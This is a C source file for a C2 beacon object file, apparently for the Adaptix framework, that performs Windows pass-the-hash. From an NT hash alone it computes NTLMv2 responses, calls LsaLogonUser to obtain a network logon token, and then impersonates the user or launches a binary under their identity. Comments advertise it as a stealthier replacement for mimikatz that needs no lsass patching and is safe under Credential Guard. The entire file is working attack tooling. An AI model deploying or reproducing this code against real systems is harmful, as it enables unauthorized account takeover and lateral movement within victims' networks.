// pth.c — Pass-the-Hash make-token / run-binary, in-process, no lsass write.
//
// Mints a Windows network-logon token from an NT hash alone via LsaLogonUser +
// MSV1_0_LM20_LOGON with a self-computed NTLMv2 response (NT hash -> NTOWFv2 ->
// NTProofStr). MSV1_0_LM20_LOGON with LocalGroups=NULL needs NO SeTcbPrivilege, so
// this works from an admin beacon (LsaConnectUntrusted). Network logon -> network
// (impersonation) token; DuplicateTokenEx(TokenPrimary) + CreateProcessWithTokenW
// runs a binary as the hash-user. No lsass patching, no driver, Credential-Guard-safe.
//
// MITRE T1550.002 (Use Alternate Auth Material: Pass the Hash).
// Replaces: mimikatz sekurlsa::pth (lsass-patch), runas /netonly (plaintext),
//           netexec smb --hashes, psexec.py --hashes (for local-token PTH use).
//
// Usage (axs): pth <user> <domain> <nthash> [binary]
//   nthash may be "31d6..." or full "aad3...:31d6..." (lm:nth) form.
//   binary omitted -> impersonate the beacon thread as the hash-user (like `token make`).
//   binary given  -> spawn that binary as the hash-user (network logon; reaches SMB/etc as them).
//
// Caveat: network logon token => the spawned binary has NO interactive desktop
// session; it runs and authenticates to network resources as the hash-user. Good
// for an agent / recon tool, not for "pop interactive cmd as them".

#include <windows.h>
#include <bcrypt.h>
#include "beacon.h"

// ---- local struct defs (guarded; these live in winternl.h/ntsecapi.h which we don't include) ----
#ifndef _UNICODE_STRING_DEFINED_BY_PTH
#define _UNICODE_STRING_DEFINED_BY_PTH
typedef struct _PTH_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR  Buffer; } PTH_UNICODE_STRING;
typedef struct _PTH_STRING         { USHORT Length; USHORT MaximumLength; PCHAR  Buffer; } PTH_STRING;
typedef struct _PTH_LSA_STRING     { USHORT Length; USHORT MaximumLength; PCHAR  Buffer; } PTH_LSA_STRING;
#endif

#define MsV1_0NetworkLogon          2
#define MSV1_0_CHALLENGE_LENGTH     8
#define MSV1_0_USE_CLIENT_CHALLENGE 0x80

typedef struct _PTH_MSV1_0_LM20_LOGON {
    ULONG              MessageType;                 // MSV1_0_LOGON_SUBMIT_TYPE
    PTH_UNICODE_STRING LogonDomainName;
    PTH_UNICODE_STRING UserName;
    PTH_UNICODE_STRING Workstation;
    UCHAR              ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
    PTH_STRING         CaseSensitiveChallengeResponse;   // NTLMv2 response (binary)
    PTH_STRING         CaseInsensitiveChallengeResponse; // LMv2 response (binary)
    ULONG              ParameterControl;
} PTH_MSV1_0_LM20_LOGON;

// ---- API declarations (MODULE$ -> __imp_ under the Adaptix loader) ----
WINBASEAPI DWORD    WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE   WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI LPVOID   WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI VOID     WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
WINBASEAPI WINBOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI int      WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

WINBASEAPI DWORD    WINAPI SECUR32$LsaConnectUntrusted(PHANDLE);
WINBASEAPI NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);
WINBASEAPI DWORD    WINAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PTH_LSA_STRING*, PULONG);
WINBASEAPI DWORD    WINAPI SECUR32$LsaFreeReturnBuffer(PVOID);
// LsaLogonUser prototyped with PVOID for the struct/typed params we don't depend on
// (LogonType, LocalGroups, SourceContext, LogonId, Quotas) — ABI only needs pointers.
WINBASEAPI NTSTATUS NTAPI SECUR32$LsaLogonUser(
    HANDLE LsaHandle, PTH_LSA_STRING* OriginName, ULONG LogonType,
    ULONG AuthenticationPackage, PVOID AuthenticationInformation,
    ULONG AuthenticationInformationLength, PVOID LocalGroups,
    PVOID SourceContext, PVOID* ProfileBuffer, PULONG ProfileBufferLength,
    PVOID LogonId, PHANDLE Token, PVOID Quotas, PNTSTATUS SubStatus);

WINBASEAPI BOOLEAN  WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG); // RtlGenRandom
WINADVAPI  WINBOOL  WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
WINADVAPI  WINBOOL  WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptSetProperty(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE);

// ---- libc stubs (suite Makefile has no -fno-tree-loop-distribute-patterns / no chkstk stub) ----
static void _memset(void* p, int v, SIZE_T n) { if (!p) return; unsigned char* b = (unsigned char*)p; while (n--) *b++ = (unsigned char)v; }
static void _memcpy(void* d, const void* s, SIZE_T n) { if (!d || !s) return; unsigned char* dd = (unsigned char*)d; const unsigned char* ss = (const unsigned char*)s; while (n--) *dd++ = *ss++; }

static int hexval(char c) { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return -1; }

// parse "nthash" or "lmhash:nthash" -> 16-byte NT hash. returns 1 on success.
static int parse_nthash(const char* s, UCHAR out[16]) {
    if (!s || !*s) return 0;
    const char* colon = s;
    while (*colon && *colon != ':') colon++;
    if (*colon == ':') s = colon + 1;              // take the right half of lm:nth
    for (int i = 0; i < 16; i++) {
        int hi = hexval(s[2*i]); int lo = hexval(s[2*i+1]);
        if (hi < 0 || lo < 0) return 0;
        out[i] = (UCHAR)((hi << 4) | lo);
    }
    return 1;
}

// HMAC-MD5(key, data) -> out16, via BCrypt. returns NTSTATUS (0 = ok).
static NTSTATUS hmac_md5(const UCHAR* key, ULONG keylen, const UCHAR* data, ULONG datalen, UCHAR* out16) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL; NTSTATUS st;
    st = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0);
    if (st) return st;
    ULONG fHmac = 1;
    st = BCRYPT$BCryptSetProperty(hAlg, L"HMAC", (PUCHAR)&fHmac, sizeof(fHmac), 0);
    if (st) goto done;
    st = BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, keylen, 0);
    if (st) goto done;
    st = BCRYPT$BCryptHashData(hHash, (PUCHAR)data, datalen, 0);
    if (st) goto done;
    st = BCRYPT$BCryptFinishHash(hHash, out16, 16, 0);
done:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg)  BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return st;
}

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser; BeaconDataParse(&parser, Buffer, Length);
    ULONG  userLen = 0, domLen = 0, binLen = 0;
    WCHAR* user   = (WCHAR*)BeaconDataExtract(&parser, (int*)&userLen); // wstr
    WCHAR* domain = (WCHAR*)BeaconDataExtract(&parser, (int*)&domLen);  // wstr
    char*  hashS  = BeaconDataExtract(&parser, NULL);                   // cstr (hex)
    WCHAR* binary = (WCHAR*)BeaconDataExtract(&parser, (int*)&binLen);  // wstr (optional)
    if (!user || !domain || !hashS) return;

    UCHAR nthash[16]; _memset(nthash, 0, 16);
    if (!parse_nthash(hashS, nthash)) {
        BeaconPrintf(CALLBACK_ERROR, "pth: invalid NT hash (need 32 hex chars, or lm:nth)\n");
        return;
    }

    // NTOWFv2 = HMAC_MD5(NThash, UNICODE(ToUpper(user) || domain))
    ULONG userChars = userLen / 2, domChars = domLen / 2;
    WCHAR* ud = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(userChars + domChars + 1) * 2);
    if (!ud) { BeaconPrintf(CALLBACK_ERROR, "pth: alloc failed\n"); return; }
    for (ULONG i = 0; i < userChars; i++) {
        WCHAR c = user[i];
        if (c >= L'a' && c <= L'z') c -= 0x20;        // uppercase username per MS-NLMP
        ud[i] = c;
    }
    for (ULONG i = 0; i < domChars; i++) ud[userChars + i] = domain[i];
    UCHAR ntowfv2[16]; _memset(ntowfv2, 0, 16);
    NTSTATUS st = hmac_md5(nthash, 16, (const UCHAR*)ud, (userChars + domChars) * 2, ntowfv2);
    if (st) { KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ud); BeaconPrintf(CALLBACK_ERROR, "pth: NTOWFv2 HMAC failed 0x%08lx\n", (unsigned long)st); return; }

    // challenges + timestamp
    UCHAR serverCh[8], clientCh[8];
    ADVAPI32$SystemFunction036(serverCh, 8);
    ADVAPI32$SystemFunction036(clientCh, 8);
    FILETIME ft; KERNEL32$GetSystemTimeAsFileTime(&ft);
    UCHAR ts[8]; _memcpy(ts, &ft, 8);                 // FILETIME = 100ns since 1601 (NTLMv2 blob timestamp)

    // NTLMv2 blob (temp): sig(4)=01010000 | resv(4)=0 | ts(8) | clientCh(8) | resv(4)=0 | targetInfo(0)
    UCHAR temp[28];
    temp[0]=0x01; temp[1]=0x01; temp[2]=0x00; temp[3]=0x00;
    temp[4]=0; temp[5]=0; temp[6]=0; temp[7]=0;
    _memcpy(temp+8, ts, 8);
    _memcpy(temp+16, clientCh, 8);
    temp[24]=0; temp[25]=0; temp[26]=0; temp[27]=0;

    // NTProofStr = HMAC_MD5(NTOWFv2, serverCh || temp); NtResponse = NTProofStr || temp
    UCHAR scTemp[36]; _memcpy(scTemp, serverCh, 8); _memcpy(scTemp+8, temp, 28);
    UCHAR ntproof[16]; _memset(ntproof, 0, 16);
    st = hmac_md5(ntowfv2, 16, scTemp, 36, ntproof);
    if (st) { KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ud); BeaconPrintf(CALLBACK_ERROR, "pth: NTProofStr HMAC failed 0x%08lx\n", (unsigned long)st); return; }
    UCHAR ntResp[44]; _memcpy(ntResp, ntproof, 16); _memcpy(ntResp+16, temp, 28);

    // LMv2 = HMAC_MD5(NTOWFv2, serverCh || clientCh)(16) || clientCh(8) -> 24 bytes
    UCHAR scCc[16]; _memcpy(scCc, serverCh, 8); _memcpy(scCc+8, clientCh, 8);
    UCHAR lm16[16]; _memset(lm16, 0, 16);
    hmac_md5(ntowfv2, 16, scCc, 16, lm16);
    UCHAR lmResp[24]; _memcpy(lmResp, lm16, 16); _memcpy(lmResp+16, clientCh, 8);

    // build MSV1_0_LM20_LOGON
    PTH_MSV1_0_LM20_LOGON auth; _memset(&auth, 0, sizeof(auth));
    auth.MessageType = MsV1_0NetworkLogon;
    auth.LogonDomainName.Length = (USHORT)domLen;  auth.LogonDomainName.MaximumLength = (USHORT)domLen;  auth.LogonDomainName.Buffer = domain;
    auth.UserName.Length       = (USHORT)userLen; auth.UserName.MaximumLength       = (USHORT)userLen; auth.UserName.Buffer       = user;
    auth.Workstation.Length = 0; auth.Workstation.Buffer = NULL;                  // empty workstation
    _memcpy(auth.ChallengeToClient, serverCh, 8);
    auth.CaseSensitiveChallengeResponse.Length = 44;   auth.CaseSensitiveChallengeResponse.MaximumLength = 44;   auth.CaseSensitiveChallengeResponse.Buffer = (PCHAR)ntResp;
    auth.CaseInsensitiveChallengeResponse.Length = 24; auth.CaseInsensitiveChallengeResponse.MaximumLength = 24; auth.CaseInsensitiveChallengeResponse.Buffer = (PCHAR)lmResp;
    auth.ParameterControl = MSV1_0_USE_CLIENT_CHALLENGE;

    // LSA connect + logon
    HANDLE lsa = NULL;
    if (SECUR32$LsaConnectUntrusted(&lsa)) { BeaconPrintf(CALLBACK_ERROR, "pth: LsaConnectUntrusted failed %lu\n", KERNEL32$GetLastError()); goto cleanup_creds; }
    ULONG pkgId = 0;
    PTH_LSA_STRING pkgName; pkgName.Length = 6; pkgName.MaximumLength = 7; pkgName.Buffer = (PCHAR)"MSV1_0";
    if (SECUR32$LsaLookupAuthenticationPackage(lsa, &pkgName, &pkgId)) { BeaconPrintf(CALLBACK_ERROR, "pth: LsaLookupAuthenticationPackage failed %lu\n", KERNEL32$GetLastError()); goto cleanup_lsa; }

    PTH_LSA_STRING origin; origin.Length = 3; origin.MaximumLength = 4; origin.Buffer = (PCHAR)"pth";
    UCHAR srcBuf[16]; _memset(srcBuf, 0, 16); srcBuf[0]='p'; srcBuf[1]='t'; srcBuf[2]='h'; srcBuf[3]='-'; srcBuf[4]='b'; srcBuf[5]='o'; srcBuf[6]='f';
    ULONGLONG logonId = 0;
    UCHAR quotaBuf[48]; _memset(quotaBuf, 0, 48);
    PVOID profile = NULL; ULONG profileLen = 0; HANDLE hToken = NULL; NTSTATUS subStatus = 0;
    st = SECUR32$LsaLogonUser(lsa, &origin, 3 /*Network*/, pkgId, &auth, sizeof(auth),
                              NULL /*LocalGroups => no SeTcb*/, srcBuf, &profile, &profileLen,
                              (PVOID)&logonId, &hToken, quotaBuf, &subStatus);
    if (st) {
        BeaconPrintf(CALLBACK_ERROR, "pth: LsaLogonUser failed 0x%08lx (sub 0x%08lx) — bad hash/user, or account/logon-hours restriction\n",
                     (unsigned long)st, (unsigned long)subStatus);
        if (profile) SECUR32$LsaFreeReturnBuffer(profile);
        goto cleanup_lsa;
    }
    if (profile) SECUR32$LsaFreeReturnBuffer(profile);

    if (binary && binLen > 0 && binary[0] != 0) {
        // run the binary as the hash-user
        HANDLE hPrimary = NULL;
        if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary)) {
            BeaconPrintf(CALLBACK_ERROR, "pth: DuplicateTokenEx failed %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hToken); goto cleanup_lsa;
        }
        STARTUPINFOW si; _memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; _memset(&pi, 0, sizeof(pi));
        if (ADVAPI32$CreateProcessWithTokenW(hPrimary, 0, binary, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            BeaconPrintf(CALLBACK_OUTPUT, "PTH: spawned %ls pid %lu as %ls\\%ls (network logon from NT hash)\n", binary, (unsigned long)pi.dwProcessId, domain, user);
            KERNEL32$CloseHandle(pi.hProcess); KERNEL32$CloseHandle(pi.hThread);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "pth: CreateProcessWithTokenW failed %lu (need SeImpersonate / check binary path)\n", KERNEL32$GetLastError());
        }
        KERNEL32$CloseHandle(hPrimary);
        KERNEL32$CloseHandle(hToken);
    } else {
        // impersonate the beacon thread as the hash-user (mirrors `token make`)
        if (BeaconUseToken(hToken)) {
            BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully: %ls\\%ls (logon: 3)\n", domain, user);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "pth: BeaconUseToken failed %lu\n", KERNEL32$GetLastError());
        }
        // BeaconUseToken takes ownership; do not close hToken here.
    }

cleanup_lsa:
    if (lsa) SECUR32$LsaDeregisterLogonProcess(lsa);
cleanup_creds:
    // best-effort wipe of secret material
    _memset(nthash, 0, 16); _memset(ntowfv2, 0, 16); _memset(ntproof, 0, 16); _memset(lm16, 0, 16);
    if (ud) { _memset(ud, 0, (SIZE_T)(userChars + domChars) * 2); KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ud); }
}